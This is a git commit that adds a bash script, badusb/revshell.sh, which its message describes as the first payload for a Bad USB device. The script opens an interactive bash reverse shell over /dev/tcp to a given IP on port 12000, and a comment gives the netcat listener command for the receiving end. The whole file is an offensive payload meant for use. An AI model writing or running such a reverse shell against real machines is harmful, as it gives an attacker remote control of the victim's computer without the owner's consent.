e441febaa96ad35451131fa09a7e65261c2ab4f0
Ocelot <57074600+jtbursey@users.noreply.github.com>
2024-12-12 22:20:31 -0800

    Create revshell.sh
    First payload simply reverse shells out to a server. Bad USB can give the IP

---
+++ badusb/revshell.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+# Serve a reverse shell to the chosen IP.
+# Server should already be listening with:
+# nc -lvnp 12000 -s ${ip}
+
+ip="127.0.0.1"
+if [[ $1 != "" ]]; then
+  ip=$1
+fi
+
+/bin/bash -c 'bash -i >&/dev/tcp/${ip}/12000 0>&1'
